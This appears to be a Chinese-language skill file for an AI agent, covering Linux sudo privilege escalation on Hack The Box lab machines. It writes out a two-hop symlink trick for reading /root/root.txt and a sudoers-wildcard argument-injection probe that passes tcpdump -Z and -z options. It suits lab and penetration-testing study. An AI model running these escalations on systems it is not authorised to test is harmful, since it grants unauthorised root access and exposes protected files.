---
name: 'sudo-escape-techniques'
description: 'Sudo Escape 全集 + 双跳符号链接绕过脚本路径验证 + 🆕 **sudoers 参数里的 `*` 可以跨 `/`**（参数注入/选项走私，2026-10-01 Dump 实测）。（检索词：sudo escape techniques/sudoers 通配符/sudo -l 带星号/wildcard/参数注入/选项注入/argument injection/tcpdump -Z/-z/-V/FNM_PATHNAME）'
whenToUse: '`sudo -l` 有结果时：GTFOBins 对号入座 + env_keep + **参数里的通配符（可跨 `/`）** + 脚本 symlink 双跳 + 版本 CVE'
metadata: { domain: linux, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Sudo Escape 技术全集

> HTB 统计: Easy 18台 + Medium 15台 + Hard/Insane 大量 = **最常用的 Linux 提权向量**

## 决策矩阵: sudo -l 结果 → 提权路径

```bash
sudo -l
# 分析输出，对号入座:
```

## 1. Shell Escape (sudo 给 shell) + GTFOBins 矩阵

（见旧版，保持不变）

## 2. Custom Script / Config 类 — sudo 到脚本 + 可控输入

```
模式: sudo /path/to/script.sh <attacker_params>

检查:
[ ] 脚本读 $1/$2 → 注入？
[ ] 脚本读环境变量 → PYTHONPATH/PATH hijack？
[ ] 脚本读配置文件 → 写恶意配置？
[ ] 脚本里的路径引用 → symlink attack？
[ ] 脚本用 eval/system → 命令注入？

HTB 案例:
- Code: sudo backy.sh config → JSON path traversal → 读 /root
- DevArea: sudo syswatch.sh logs <file> → 双跳 symlink → 读 /root/root.txt
- PermX: sudo ACL script → symlink /etc/sudoers
```

### 🆕 2.1 双跳符号链接绕过路径验证

**场景**: sudo 脚本检查了第一层 symlink 的 target 是否安全（不含 `/`、`..`），但 `cat` 会跟踪整个 symlink 链。

**模式**:
```bash
# 直接 symlink 被拦截（target 含 /）
ln -sf /root/root.txt /opt/logs/escape.log
sudo script.sh logs escape.log
# → "Blocked unsafe symlink target"

# 双跳绕过：第一层指向简单文件名，第二层指向真实目标
ln -sf /root/root.txt /opt/logs/service.log           # 第二层（底层）
ln -sf service.log /opt/logs/network.log              # 第一层（表层，target="service.log" 通过检查）
sudo script.sh logs network.log                       # cat 自动跟踪全链 → 读 /root/root.txt
```

**适用条件**:
1. 脚本对 symlink 做安全检查，但只检查第一层 target
2. 脚本最终用 `cat` 或类似命令读取文件（自动解析 symlink）
3. 你有权在目标目录创建文件和 symlink（通常通过另一个漏洞获得）

**真实案例**: DevArea — syswatch 命令注入 → syswatch 用户创建双跳链 → sudo logs 读 root flag

**为什么有效**: `view_logs()` 只验证 `readlink()` 的第一层输出是否包含 `/`，然后调用 `cat`。Linux 内核的 VFS 层自动跟踪所有 symlink 层，`cat` 最终到达原始目标文件。

### 🔴 2.2 sudoers 的 `*` 在**参数**里可以匹配 `/`（2026-10-01 Dump 实测）

这条反直觉，且**推错一次就会整条路放弃**：

| 匹配对象 | 通配符行为 |
|---|---|
| sudoers 里的**命令路径** | 用 `FNM_PATHNAME` ⇒ `*` **不能**跨 `/` |
| sudoers 里的**参数串** | **不是**这条规则 ⇒ `*` **可以匹配 `/`** |

sudo 把用户 argv 用空格拼成一个字符串，再与 sudoers 的 args 串做 fnmatch
⇒ **模式里只要有一个 `*`，就能在它覆盖的区间里插入任意多个额外参数**（用空格切分，且参数里可以带 `/`）。

```bash
# Dump: sudo -l 给出
#   (ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 \
#        -w/var/cache/captures/*/<uuid8-4-4-4-12> \
#        -F/var/cache/captures/filter.<uuid>
# 探针：插进 * 的覆盖区间，看 sudo 是否放行（-n 避免交互）
sudo -n tcpdump -c10 -w/var/cache/captures/x -Zroot -z/bin/true -G1 -W1 \
     -w /<uuid> -F/var/cache/captures/filter.<uuid>      # 放行 ⇒ * 可跨 /
```
拿到任意参数注入之后，能干什么取决于**那个命令的选项表**：GTFOBins 只列"整条命令怎么用"，
不列"某个选项能执行命令/写文件/读文件" —— 后者要读手册逐个翻（tcpdump 的 `-Z` 改身份、
`-w` 改写入目标、`-z` 执行命令、`-r`+`-w` 复制文件、`-V` 泄漏文件首行就是例子）。
完整判据、家族清单与沙箱截断时的处理，见 **`argument-injection-option-smuggling`**。

## 3-7. LD_PRELOAD / Sudo CVE / Token Reuse（见旧版）

## 快速检查清单

```bash
[ ] sudo -l — 列出所有允许的命令
[ ] 每个命令 — 对照 GTFOBins (gtfobins.github.io)
[ ] 检查 env_keep: sudo -l | grep -i env
[ ] 🔴 检查通配符: sudo -l 中有 * ？→ **参数里的 * 可跨 `/`** ⇒ 可插任意额外参数（§2.2）
[ ] sudo --version → CVE 检查
[ ] 🆕 脚本读文件？→ 检查 symlink 验证逻辑 → 能否双跳？
```
